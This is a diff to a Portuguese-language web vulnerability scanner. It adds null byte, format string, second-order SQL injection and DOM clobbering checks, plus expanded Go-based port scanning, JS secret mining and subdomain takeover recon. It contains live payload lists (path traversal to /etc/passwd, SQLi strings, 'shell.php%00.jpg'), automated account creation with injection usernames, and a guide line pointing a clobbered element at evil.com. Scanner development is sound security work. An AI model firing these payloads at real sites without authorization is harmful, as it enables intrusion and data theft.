@@ -11665,10 +11665,270 @@ class VulnScanner:
     def check_bruteforce(self):
         # Implementação básica conectando com o passcrack via lógica ou execução do script externo
         if self.login_url:
-            self._add(101, "Ataque de Força Bruta (Passcrack)", "Auth", "CRITICO", "SKIP", 
+            self._add(101, "Ataque de Força Bruta (Passcrack)", "Auth", "CRITICO", "SKIP",
                       evidence="Verificado manualmente ou via pass_crack.py",
                       recommendation="Implementar Rate Limiting, reCAPTCHA e bloqueio temporário.",
                       technique="Bruteforce na página de login")
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # CHECK 114 — NULL BYTE INJECTION
+    # Testa %00 / \x00 em parâmetros GET para bypass de filtros de extensão,
+    # LFI e upload validation. Detecta por truncamento de resposta ou erro.
+    # ─────────────────────────────────────────────────────────────────────────
+    def check_null_byte_injection(self):
+        """Null Byte Injection — %00 / \\x00 em parâmetros para bypass de filtros."""
+        NULL_PAYLOADS = [
+            "%00", "%00.jpg", "%00.png", "%00.gif", "%00.pdf",
+            "\x00", "\x00.jpg", "%2500",           # double-encoded
+            "..%00/", "..%2500/",                  # path traversal + null
+            "%00/../etc/passwd",
+            "file%00.jpg",
+        ]
+        vuln = False
+        evidence = ""
+
+        baseline_r = safe_get(self.target)
+        baseline_len = len(baseline_r.text) if baseline_r else 0
+
+        for url in (self._get_urls_with_params() or [])[:20]:
+            parsed = urlparse(url)
+            params = parse_qs(parsed.query)
+            if not params:
+                continue
+            # Focar em parâmetros com nomes sugestivos de arquivo/path
+            priority = [k for k in params if any(w in k.lower()
+                        for w in ["file","path","page","doc","img","image","dir","name","load","url","src"])]
+            targets = priority if priority else list(params.keys())
+            for param in targets[:3]:
+                for payload in NULL_PAYLOADS[:6]:
+                    new_params = {k: (payload if k == param else v[0]) for k, v in params.items()}
+                    test_url = parsed._replace(query=urlencode(new_params)).geturl()
+                    r = safe_get(test_url)
+                    if not r:
+                        continue
+                    body = r.text.lower()
+                    # Indicadores de null byte processado:
+                    # 1) Erro de extensão inesperado
+                    # 2) Conteúdo de arquivo (etc/passwd)
+                    # 3) Resposta truncada (len drasticamente diferente)
+                    if any(sig in body for sig in ["root:x:", "/bin/bash", "/bin/sh",
+                                                    "no such file", "invalid file",
+                                                    "null byte", "unexpected null"]):
+                        vuln = True
+                        evidence = (f"URL: {test_url} | Param: {param} | Payload: {repr(payload)} "
+                                    f"→ indicador encontrado na resposta")
+                        break
+                    # Truncamento suspeito: resposta muito menor que baseline
+                    if baseline_len > 500 and r.status_code == 200:
+                        ratio = len(r.text) / baseline_len
+                        if ratio < 0.1:
+                            vuln = True
+                            evidence = (f"URL: {test_url} | Param: {param} | Payload: {repr(payload)} "
+                                        f"→ resposta truncada ({len(r.text)} vs baseline {baseline_len} bytes)")
+                            break
+                if vuln:
+                    break
+            if vuln:
+                break
+
+        status = "VULNERAVEL" if vuln else "SEGURO"
+        self._add(114, "Null Byte Injection", "Injection", "ALTO", status,
+                  url=self.target,
+                  evidence=evidence,
+                  recommendation=(
+                      "Sanitizar null bytes antes de processar parâmetros. "
+                      "Usar funções seguras de manipulação de arquivo. "
+                      "Rejeitar qualquer input contendo \\x00 ou %00."
+                  ),
+                  technique=f"Null byte (%00/\\x00) em {len(NULL_PAYLOADS)} variantes — bypass de filtros de extensão e path")
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # CHECK 115 — FORMAT STRING
+    # Testa %s %n %x %d em parâmetros. Detecta por crash, vazamento de memória
+    # ou resposta contendo ponteiros/hex. Comum em C/C++, Go, alguns Python/PHP.
+    # ─────────────────────────────────────────────────────────────────────────
+    def check_format_string(self):
+        """Format String — payloads %s/%n/%x em parâmetros para detectar vazamento de memória."""
+        FMT_PAYLOADS = [
+            "%s%s%s%s%s",
+            "%x%x%x%x",
+            "%n%n%n%n",
+            "%d%d%d%d",
+            "%p%p%p%p",
+            "AAAA%08x.%08x.%08x",
+            "%s%p%x%d",
+            "{{7*7}}",          # Python/Jinja fallback (overlap com SSTI, mas útil aqui)
+            "{0.__class__}",    # Python format() abuse
+            "%1$s%2$s%3$s",     # Numbered format specifiers (PHP sprintf)
+        ]
+        # Padrões que indicam format string processada:
+        LEAK_PATTERNS = [
+            r"0x[0-9a-fA-F]{4,}",       # endereços hex
+            r"(?:AAAA){1,}[0-9a-f]+",   # canary AAAA + hex
+            r"\(nil\)",                  # ponteiro nulo C
+            r"Segmentation fault",
+            r"core dumped",
+            r"49 — ",                    # hex de 'I' (ASCII 0x49)
+        ]
+
+        vuln = False
+        evidence = ""
+
+        for url in (self._get_urls_with_params() or [])[:15]:
+            parsed = urlparse(url)
+            params = parse_qs(parsed.query)
+            if not params:
+                continue
+            for param in list(params.keys())[:4]:
+                for payload in FMT_PAYLOADS[:6]:
+                    new_params = {k: (payload if k == param else v[0]) for k, v in params.items()}
+                    test_url = parsed._replace(query=urlencode(new_params)).geturl()
+                    r = safe_get(test_url)
+                    if not r:
+                        continue
+                    # Verificar se o payload aparece processado (não literal) na resposta
+                    # Se o servidor retornar o payload literal → não vulnerável
+                    # Se retornar hex/null/crash → vulnerável
+                    if payload in r.text:
+                        continue  # Refletido sem processar = não vulnerável
+                    for pat in LEAK_PATTERNS:
+                        if re.search(pat, r.text):
+                            vuln = True
+                            evidence = (f"URL: {test_url} | Param: {param} | Payload: {repr(payload)} "
+                                        f"→ padrão '{pat}' detectado na resposta (possível leak de memória)")
+                            break
+                    # Também checar: status 500 com payload de format string = crash potencial
+                    if not vuln and r.status_code == 500:
+                        # Comparar com resposta baseline
+                        base = safe_get(url)
+                        if base and base.status_code != 500:
+                            vuln = True
+                            evidence = (f"URL: {test_url} | Param: {param} | Payload: {repr(payload)} "
+                                        f"→ HTTP 500 com payload de format string (baseline retornou {base.status_code})")
+                    if vuln:
+                        break
+                if vuln:
+                    break
+            if vuln:
+                break
+
+        status = "VULNERAVEL" if vuln else "SEGURO"
+        self._add(115, "Format String Vulnerability", "Injection", "ALTO", status,
+                  url=self.target,
+                  evidence=evidence,
+                  recommendation=(
+                      "Nunca passar input do usuário diretamente para funções de format string (printf, sprintf, etc.). "
+                      "Usar sempre formato fixo: printf('%s', input) ao invés de printf(input). "
+                      "Habilitar stack canaries e ASLR."
+                  ),
+                  technique=f"Format string payloads (%s/%n/%x/%p) em parâmetros — detecção por leak de memória ou crash")
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # CHECK 116 — SECOND-ORDER SQL INJECTION
+    # Injeta payload em campo persistente (ex: cadastro, perfil, comentário),
+    # depois recupera via leitura e detecta execução diferida do payload.
+    # ─────────────────────────────────────────────────────────────────────────
+    def check_second_order_sqli(self):
+        """Second-Order SQLi — injeta em campos persistentes e lê de volta para detectar execução diferida."""
+        CANARY     = "CYBERDYNE_2ND_ORDER"
+        # Payload: canary + SQLi clássico que causa erro em recuperação
+        SOI_PAYLOAD = f"{CANARY}' OR '1'='1"
+        SOI_PAYLOADS = [
+            f"{CANARY}' OR '1'='1",
+            f"{CANARY}\"",
+            f"{CANARY}\\",
+            f"{CANARY}' --",
+            f"{CANARY}' UNION SELECT 1--",
+        ]
+        # Endpoints candidatos para persistência de dados
+        WRITE_PATHS = [
+            "/register", "/signup", "/api/register", "/api/user",
+            "/profile", "/api/profile", "/account", "/api/account",
+            "/comment", "/api/comment", "/feedback", "/api/feedback",
+            "/contact", "/api/contact",
+        ]
+        # Campos comuns de username/nome (onde SQLi de segunda ordem costuma ocorrer)
+        USER_FIELDS = ["username", "user", "name", "firstName", "first_name",
+                       "displayName", "display_name", "nickname"]
+
+        vuln = False
+        evidence = ""
+
+        for write_path in WRITE_PATHS:
+            write_url = self.target.rstrip("/") + write_path
+            for payload in SOI_PAYLOADS[:3]:
+                # Tentar POST com payload em campo de username/nome
+                for field in USER_FIELDS[:4]:
+                    try:
+                        data = {
+                            field: payload,
+                            "email": f"cyberdyne_{int(time.time())}@test.com",
+                            "password": "CyberDyne@2025!",
+                            "password2": "CyberDyne@2025!",
+                            "confirm": "CyberDyne@2025!",
+                        }
+                        r_write = requests.post(
+                            write_url, data=data, headers=HEADERS_BASE,
+                            verify=False, timeout=10, allow_redirects=True,
+                            cookies=_auth_cookies or None
+                        )
+                        if not r_write or r_write.status_code in [403, 404, 405, 429]:
+                            continue
+
+                        # Se o campo foi aceito (201/200/302), tentar ler de volta
+                        if r_write.status_code in [200, 201, 302]:
+                            # Tentar endpoints de leitura/perfil
+                            READ_PATHS = ["/profile", "/account", "/me", "/api/me",
+                                          "/api/user/me", "/api/profile",
+                                          "/dashboard", "/home"]
+                            for read_path in READ_PATHS:
+                                r_read = safe_get(self.target.rstrip("/") + read_path)
+                                if not r_read:
+                                    continue
+                                body = r_read.text
+                                # Se o CANARY não aparece MAS há erro SQL → execução diferida
+                                has_canary = CANARY in body
+                                has_sql_err = any(e in body.lower() for e in [
+                                    "sql syntax", "mysql_fetch", "ora-", "pg_query",
+                                    "sqlite3", "sqlstate", "unclosed quotation",
+                                    "unterminated string", "column count",
+                                ])
+                                if has_sql_err and not has_canary:
+                                    vuln = True
+                                    evidence = (
+                                        f"Second-Order SQLi: payload '{payload}' enviado via POST {write_path} "
+                                        f"→ erro SQL detectado em {read_path}: "
+                                        + next((e for e in ["sql syntax","mysql_fetch","ora-","pg_query","sqlstate"]
+                                                if e in body.lower()), "erro SQL")
+                                    )
+                                    break
+                                # Se o payload literal aparece na leitura = persistido sem sanitizar (suspeito)
+                                if SOI_PAYLOADS[0].split("'")[0] in body and "'" in body:
+                                    # Pode ser reflexo sem execução, mas é indicativo
+                                    evidence = (
+                                        f"Payload de segunda ordem '{payload[:30]}' persistido sem escape "
+                                        f"em {write_path} → recuperado em {read_path} (confirmar manualmente)"
+                                    )
+                                    # Não marca como VULNERAVEL definitivo sem erro SQL confirmado
+                            if vuln:
+                                break
+                    except Exception:
+                        continue
+                if vuln:
+                    break
+            if vuln:
+                break
+
+        status = "VULNERAVEL" if vuln else "SEGURO"
+        self._add(116, "Second-Order SQL Injection", "Injection", "CRITICO", status,
+                  url=self.target,
+                  evidence=evidence,
+                  recommendation=(
+                      "Sanitizar e parametrizar dados ANTES de qualquer leitura/uso — não só no input inicial. "
+                      "Usar prepared statements em todas as queries, incluindo as que leem dados salvos. "
+                      "Nunca confiar que dados do banco estão 'seguros' porque já foram validados antes."
+                  ),
+                  technique="POST com payload em campos persistentes (username/nome) + leitura diferida via /profile /me")
 
     def run_all(self, subdomains=None, skip_ids=None, resume_group=0):
         skip_ids = skip_ids or set()
@@ -11681,6 +11941,9 @@ class VulnScanner:
                 self.check_lfi, self.check_rfi,
                 self.check_cmd_injection, self.check_ssrf, self.check_xxe,
                 self.check_ssti, self.check_nosql_injection,
+                self.check_null_byte_injection,
+                self.check_format_string,
+                self.check_second_order_sqli,
             ]),
             ("OWASP — Auth / Acesso", [
                 self.check_csrf, self.check_idor,
@@ -13532,6 +13795,106 @@ class CyberBrowser:
         finally:
             page.close()
 
+    # ─────────────────────────────────────────────────────────────────────
+    # CHECK 217 — DOM CLOBBERING
+    # Injeta elementos HTML com id/name que sobrescrevem globals do DOM
+    # (window.x, document.x, document.forms, etc.) e verifica se a lógica
+    # JS da aplicação é afetada (leitura de propriedade clobbered).
+    # ─────────────────────────────────────────────────────────────────────
+    def check_dom_clobbering(self):
+        """DOM Clobbering — sobrescreve propriedades globais via id/name HTML."""
+        page = self._new_page()
+        try:
+            page.goto(self.target, timeout=15000, wait_until="domcontentloaded")
+            page.wait_for_timeout(2000)
+
+            # Coletar globals JS relevantes antes do clobbering
+            pre_globals = page.evaluate("""() => {
+                const keys = ['x','config','settings','data','user','admin','token',
+                              'csrf','form','init','app','api','base','root','router'];
+                const result = {};
+                for (const k of keys) {
+                    try { result[k] = typeof window[k]; } catch(e) { result[k] = 'error'; }
+                }
+                return result;
+            }""")
+
+            # Injetar elementos de clobbering via innerHTML
+            clobbering_html = """
+                <a id="x" href="javascript:void(0)">clobbered</a>
+                <a id="config" href="javascript:void(0)">clobbered</a>
+                <a id="user" href="javascript:void(0)">clobbered</a>
+                <a id="token" href="javascript:void(0)">clobbered</a>
+                <form id="csrf" name="csrf"><input name="token" value="CYBERDYNE_CLOB"></form>
+                <img id="settings" name="settings" src="x">
+                <a id="admin" href="//CYBERDYNE_CLOB">admin</a>
+                <a id="app" name="base" href="//CYBERDYNE_CLOB">app</a>
+            """
+            page.evaluate(f"""() => {{
+                const div = document.createElement('div');
+                div.innerHTML = `{clobbering_html}`;
+                document.body.appendChild(div);
+            }}""")
+            page.wait_for_timeout(1000)
+
+            # Verificar se globals foram sobrescritas (clobbered)
+            post_globals = page.evaluate("""() => {
+                const keys = ['x','config','settings','data','user','admin','token',
+                              'csrf','form','init','app','api','base','root','router'];
+                const result = {};
+                for (const k of keys) {
+                    try {
+                        const val = window[k];
+                        result[k] = {
+                            type: typeof val,
+                            isClobbered: val instanceof HTMLElement || val instanceof HTMLCollection,
+                            tagName: val && val.tagName ? val.tagName : null,
+                            href: val && val.href ? val.href : null,
+                        };
+                    } catch(e) { result[k] = {type:'error', isClobbered:false}; }
+                }
+                // Verificar document.forms clobbering
+                result['_csrf_form'] = {
+                    type: typeof document['csrf'],
+                    isClobbered: document['csrf'] instanceof HTMLElement,
+                };
+                return result;
+            }""")
+
+            clobbered = []
+            for key, info in post_globals.items():
+                if isinstance(info, dict) and info.get("isClobbered"):
+                    tag = info.get("tagName") or "HTMLElement"
+                    href = info.get("href") or ""
+                    detail = f"window.{key} → <{tag}>"
+                    if "CYBERDYNE_CLOB" in (href or ""):
+                        detail += " (href aponta para domínio controlável!)"
+                    clobbered.append(detail)
+
+            if clobbered:
+                ss = self._screenshot(page, "dom_clobbering")
+                self.scanner._add(217, "DOM Clobbering", "Browser", "ALTO", "VULNERAVEL",
+                    url=self.target,
+                    evidence=(
+                        f"Propriedades sobrescritas via elementos HTML: {'; '.join(clobbered[:5])} | "
+                        f"Injeção via id/name de <a>/<form>/<img> sobrescreveu globals do window/document"
+                    ),
+                    recommendation=(
+                        "Usar 'const'/'let' em vez de vars globais. "
+                        "Não acessar window[key] com valores derivados do DOM. "
+                        "Implementar DOMPurify com SANITIZE_DOM:true. "
+                        "Evitar lógica JS que dependa de propriedades do document/window por nome de campo HTML."
+                    ),
+                    technique=f"Playwright: injeção de <a id=x>/<form id=csrf> → {len(clobbered)} globals clobbered")
+            else:
+                self.scanner._add(217, "DOM Clobbering", "Browser", "ALTO", "SEGURO",
+                    technique="Playwright: elementos HTML com id/name não sobrescreveram globals JS")
+        except Exception as e:
+            self.scanner._add(217, "DOM Clobbering", "Browser", "ALTO", "SEGURO",
+                technique=f"Playwright: erro ao testar DOM Clobbering — {str(e)[:80]}")
+        finally:
+            page.close()
+
     # ── Runner Principal ──────────────────────────────────────────────────
     def run_all(self):
         if not HAS_PLAYWRIGHT:
@@ -13543,7 +13906,7 @@ class CyberBrowser:
         log(f"  FASE 2.5 — BROWSER MIMIC (Playwright)")
         log(f"{'='*60}{Style.RESET_ALL}")
         log(f"  {Fore.MAGENTA}Anti-fingerprint + Bezier mouse + Human typing{Style.RESET_ALL}")
-        log(f"  {Fore.MAGENTA}16 checks client-side com browser real{Style.RESET_ALL}\n")
+        log(f"  {Fore.MAGENTA}17 checks client-side com browser real{Style.RESET_ALL}\n")
 
         try:
             self._start_browser()
@@ -13569,6 +13932,7 @@ class CyberBrowser:
             ("Redirect Chain",         self.check_redirect_chain),
             ("Shadow DOM Leak",        self.check_shadow_dom_leak),
             ("Network Interception",   self.check_network_interception),
+            ("DOM Clobbering",         self.check_dom_clobbering),
         ]
 
         for i, (name, check_fn) in enumerate(checks, 1):
@@ -13650,6 +14014,11 @@ class ReportGenerator:
         98: "1) Verificar presença: GET /.well-known/security.txt. 2) Validar campos: Contact, Expires, Encryption, Policy. 3) Reportar via email em Contact: se há bug bounty.",
         99: "1) Acessar /robots.txt e mapear paths bloqueados. 2) Tentar acessar todos os paths de Disallow diretamente. 3) Verificar paths admin, backup, api.",
         100: "1) Testar sem autenticação via múltiplas requisições. 2) Verificar headers de rate-limit: X-RateLimit-Remaining. 3) Burst: ab -n 200 -c 50 URL.",
+        # Novos checks
+        114: "1) Adicionar %00 ao final de parâmetros de arquivo: ?file=../etc/passwd%00.jpg. 2) Testar %2500 (double-encoded). 3) Em uploads, enviar filename='shell.php%00.jpg'. 4) Verificar se filtro de extensão é bypassado.",
+        115: "1) Inserir payload: ?q=%s%s%s%s. 2) Observar resposta — hex, ponteiros ou crash = vulnerável. 3) Testar: ?name=AAAA%08x.%08x.%08x. 4) Status 500 com payload mas 200 sem = crash confirmado.",
+        116: "1) Cadastrar usuário com username: admin'--. 2) Navegar para /profile ou /dashboard. 3) Verificar se erro SQL aparece na leitura. 4) Testar com sqlmap --second-url=/profile --forms.",
+        217: "1) Abrir DevTools → Console. 2) Injetar: document.body.innerHTML += '<a id=\"config\" href=\"//evil.com\">'. 3) Executar: console.log(window.config). 4) Se retornar HTMLElement = clobbering confirmado. 5) Testar com DOMPurify e verificar se bloqueia.",
     }
 
     # ── Paleta de cores ───────────────────────────────────────────────────────
@@ -16740,7 +17109,7 @@ Exemplos de uso:
         takeover_vulns = recon_summary.get("takeover_results", [])
         all_urls      = list(set(recon_summary.get("all_urls", [target]) + fuzzing_urls))
 
-        # ── Go Turbo Fuzzer (--go) — fuzzing com 200 goroutines ──────────
+        # ── Go Engine v2 (--go) — Multi-módulo: Fuzz + PortScan + Validate + JSMine + Takeover + ParamDisc ──
         if hasattr(args, 'go') and args.go:
             _go_bin = None
             for _candidate in [
@@ -16754,8 +17123,28 @@ Exemplos de uso:
                     break
 
             if _go_bin:
-                # Preparar argumentos: target + payloads_dir + live URLs
-                _go_args = [_go_bin, target, PAYLOADS_DIR] + live_urls[:20]
+                # ── Construir argumentos do Go Engine v2 ──────────────────
+                _go_flags = [
+                    "--portscan",        # Port scan (500 goroutines, 280 portas)
+                    "--validate",        # URL validation (500 goroutines)
+                    "--jsmine",          # JS secret mining (30 regex patterns)
+                    "--takeover",        # Subdomain takeover (22 fingerprints)
+                    "--paramdiscovery",  # Parameter discovery (320 params)
+                ]
+                # URLs: live_urls validadas pelo Python como base de fuzzing
+                _go_urls = [u for u in live_urls if u.startswith("http")][:50]
+                # URLs extras: all_urls para JS mining e validação
+                _all_raw = [u for u in all_urls if u.startswith("http")][:200]
+                # Subdomínios para takeover check
+                _go_subs = [f"sub:{s}" for s in subdomains[:100] if s]
+
+                _go_args = [_go_bin, target, PAYLOADS_DIR] + _go_flags + _go_urls + _all_raw + _go_subs
+
+                log(f"\n  {Fore.CYAN + Style.BRIGHT}╔══ GO ENGINE v2 ══════════════════════════════════════╗")
+                log(f"  ║  Módulos: Fuzz • PortScan • URLValid • JSMine • Takeover • ParamDisc")
+                log(f"  ║  URLs: {len(_go_urls)} base + {len(_all_raw)} extras | Subdomínios: {len(subdomains)}")
+                log(f"  ╚═════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
+
                 try:
                     _go_proc = subprocess.Popen(
                         _go_args,
@@ -16768,49 +17157,135 @@ Exemplos de uso:
                         _go_stdout_chunks.append(_go_proc.stdout.read())
                     _stdout_thread = _thr.Thread(target=_read_go_stdout, daemon=True)
                     _stdout_thread.start()
-                    _go_proc.wait(timeout=600)
+                    _go_proc.wait(timeout=900)
                     _stdout_thread.join(timeout=5)
                     _go_stdout = "".join(_go_stdout_chunks)
 
                     if _go_proc.returncode == 0 and _go_stdout and _go_stdout.strip():
                         _go_data = json.loads(_go_stdout)
-                        _go_found = _go_data.get("found") or []
 
-                        # Salvar resultados do Go fuzzer
-                        _go_fuzz_json = os.path.join(output_dir, "recon_go_fuzz.json")
-                        with open(_go_fuzz_json, "w", encoding="utf-8") as _gf:
+                        # Salvar JSON completo do Go Engine
+                        _go_json_path = os.path.join(output_dir, "recon_go_engine.json")
+                        with open(_go_json_path, "w", encoding="utf-8") as _gf:
                             json.dump(_go_data, _gf, indent=2, ensure_ascii=False)
 
-                        # Adicionar URLs descobertas ao pool
+                        # ── 1. FUZZING RESULTS ─────────────────────────────
+                        _go_found = _go_data.get("found") or []
+                        _existing_fuzz = recon_summary.get("fuzz_paths", {})
                         for _gfi in _go_found:
                             if isinstance(_gfi, dict) and _gfi.get("url"):
                                 _furl = _gfi["url"]
                                 if _furl not in all_urls:
                                     all_urls.append(_furl)
-
-                        # Merge com fuzz_paths existente do Python
-                        _existing_fuzz = recon_summary.get("fuzz_paths", {})
-                        for _gfi in _go_found:
-                            if isinstance(_gfi, dict):
-                                _existing_fuzz[_gfi.get("url", "")] = _gfi.get("status", 0)
+                                _existing_fuzz[_furl] = _gfi.get("status", 0)
                         recon_summary["fuzz_paths"] = _existing_fuzz
-                        recon_summary["go_fuzzer"] = {
-                            "duration_sec": _go_data.get("duration_sec", 0),
-                            "total_requests": _go_data.get("total_requests", 0),
-                            "req_per_sec": _go_data.get("req_per_sec", 0),
-                            "found": len(_go_found),
+                        recon_summary["go_engine"] = {
+                            "duration_sec":    _go_data.get("duration_sec", 0),
+                            "total_requests":  _go_data.get("total_requests", 0),
+                            "req_per_sec":     _go_data.get("req_per_sec", 0),
+                            "fuzz_found":      len(_go_found),
                         }
+                        log(f"  {Fore.GREEN}[GO FUZZ] {len(_go_found)} paths | "
+                            f"{_go_data.get('duration_sec', 0):.1f}s | "
+                            f"{_go_data.get('req_per_sec', 0):.0f} req/s{Style.RESET_ALL}")
+
+                        # ── 2. PORT SCAN RESULTS ───────────────────────────
+                        _go_ports = _go_data.get("open_ports") or []
+                        if _go_ports:
+                            # Substituir port scan do Python pelos resultados Go
+                            _go_ports_fmt = [{"port": p["port"], "service": p["service"],
+                                              "version": p.get("banner", "")} for p in _go_ports]
+                            # Injetar no recon_summary como se fosse resultado do run_nmap
+                            from urllib.parse import urlparse as _up
+                            _go_host = _up(target).hostname or target
+                            if "port_scan" not in recon_summary:
+                                recon_summary["port_scan"] = {}
+                            recon_summary["port_scan"][_go_host] = {
+                                "host": _go_host,
+                                "open_ports": _go_ports_fmt,
+                                "source": "go-engine",
+                            }
+                            recon_summary["go_engine"]["ports_found"] = len(_go_ports)
+                            log(f"  {Fore.GREEN}[GO PORTSCAN] {len(_go_ports)} portas abertas{Style.RESET_ALL}")
+                            for _p in _go_ports[:10]:
+                                log(f"    {Fore.CYAN}:{_p['port']} {_p['service']} {_p.get('banner','')[:50]}{Style.RESET_ALL}")
+
+                        # ── 3. URL VALIDATION RESULTS ──────────────────────
+                        _go_live = _go_data.get("live_urls") or []
+                        if _go_live:
+                            # Adicionar ao pool de live URLs
+                            _live_set = set(live_urls)
+                            for _lu in _go_live:
+                                if isinstance(_lu, dict) and _lu.get("url"):
+                                    _u = _lu["url"]
+                                    if _u not in _live_set:
+                                        _live_set.add(_u)
+                                        live_urls.append(_u)
+                                        if _u not in all_urls:
+                                            all_urls.append(_u)
+                            recon_summary["go_engine"]["urls_validated"] = len(_go_live)
+                            log(f"  {Fore.GREEN}[GO URLVALID] {len(_go_live)} URLs vivas confirmadas{Style.RESET_ALL}")
+
+                        # ── 4. JS MINING RESULTS ───────────────────────────
+                        _go_js = _go_data.get("js_findings") or []
+                        if _go_js:
+                            # Injetar nos resultados do LinkFinder existente
+                            _lf = recon_summary.get("linkfinder", {})
+                            _lf_secrets = _lf.get("secrets", [])
+                            _lf_endpoints = _lf.get("endpoints", [])
+                            for _jf in _go_js:
+                                if not isinstance(_jf, dict):
+                                    continue
+                                _jtype = _jf.get("type", "")
+                                for _match in (_jf.get("matches") or []):
+                                    if "Endpoint" in _jtype or "URL" in _jtype or "GraphQL" in _jtype:
+                                        if _match not in _lf_endpoints:
+                                            _lf_endpoints.append(_match)
+                                    else:
+                                        _entry = f"[{_jtype}] {_match} (JS: {_jf.get('file_url','')[:60]})"
+                                        if _entry not in _lf_secrets:
+                                            _lf_secrets.append(_entry)
+                            _lf["secrets"] = _lf_secrets
+                            _lf["endpoints"] = _lf_endpoints
+                            recon_summary["linkfinder"] = _lf
+                            recon_summary["go_engine"]["js_findings"] = len(_go_js)
+                            log(f"  {Fore.GREEN}[GO JSMINE] {len(_go_js)} findings em arquivos JS{Style.RESET_ALL}")
+                            for _jf in _go_js[:5]:
+                                log(f"    {Fore.CYAN}[{_jf.get('type')}] {str(_jf.get('matches', ['']))[:80]}{Style.RESET_ALL}")
+
+                        # ── 5. TAKEOVER RESULTS ────────────────────────────
+                        _go_takeover = _go_data.get("takeover_checks") or []
+                        if _go_takeover:
+                            _vuln_tko = [t for t in _go_takeover if t.get("vulnerable")]
+                            recon_summary["takeover_results"] = _go_takeover
+                            recon_summary["go_engine"]["takeover_found"] = len(_vuln_tko)
+                            if _vuln_tko:
+                                log(f"  {Fore.RED + Style.BRIGHT}[GO TAKEOVER] {len(_vuln_tko)} subdomínios vulneráveis!{Style.RESET_ALL}")
+                                for _t in _vuln_tko:
+                                    log(f"    {Fore.RED}⚠ {_t.get('subdomain')} → {_t.get('service')} | {_t.get('fingerprint','')[:60]}{Style.RESET_ALL}")
+                                    takeover_vulns.append(_t)
+                            else:
+                                log(f"  {Fore.GREEN}[GO TAKEOVER] {len(_go_takeover)} verificados — nenhum vulnerável{Style.RESET_ALL}")
+
+                        # ── 6. PARAMETER DISCOVERY RESULTS ────────────────
+                        _go_params = _go_data.get("param_findings") or []
+                        if _go_params:
+                            recon_summary["param_discovery"] = _go_params
+                            recon_summary["go_engine"]["params_found"] = len(_go_params)
+                            log(f"  {Fore.GREEN}[GO PARAMDISCOVERY] {len(_go_params)} parâmetros descobertos{Style.RESET_ALL}")
+                            for _pp in _go_params[:5]:
+                                log(f"    {Fore.CYAN}?{_pp.get('param')} em {_pp.get('url','')[:60]} → {_pp.get('evidence','')[:60]}{Style.RESET_ALL}")
 
                         _go_dur = _go_data.get("duration_sec", 0)
-                        _go_rps = _go_data.get("req_per_sec", 0)
-                        log(f"\n  {Fore.GREEN + Style.BRIGHT}[GO FUZZER] {len(_go_found)} paths em {_go_dur:.1f}s ({_go_rps:.0f} req/s){Style.RESET_ALL}")
+                        log(f"\n  {Fore.GREEN + Style.BRIGHT}[GO ENGINE] Concluído em {_go_dur:.1f}s{Style.RESET_ALL}")
+
                     else:
-                        log(f"  {Fore.YELLOW}[GO] Fuzzer falhou (exit={_go_proc.returncode}){Style.RESET_ALL}")
+                        log(f"  {Fore.YELLOW}[GO] Engine falhou (exit={_go_proc.returncode}){Style.RESET_ALL}")
                 except subprocess.TimeoutExpired:
                     _go_proc.kill()
-                    log(f"  {Fore.YELLOW}[GO] Fuzzer timeout 600s{Style.RESET_ALL}")
+                    log(f"  {Fore.YELLOW}[GO] Engine timeout 900s{Style.RESET_ALL}")
                 except Exception as _ge:
-                    log(f"  {Fore.YELLOW}[GO] Fuzzer erro: {_ge}{Style.RESET_ALL}")
+                    log(f"  {Fore.YELLOW}[GO] Engine erro: {_ge}{Style.RESET_ALL}")
             else:
                 log(f"  {Fore.YELLOW}[GO] Binário não encontrado. Compile: cd recon_go && go build -o cyberdyne-recon .{Style.RESET_ALL}")
 
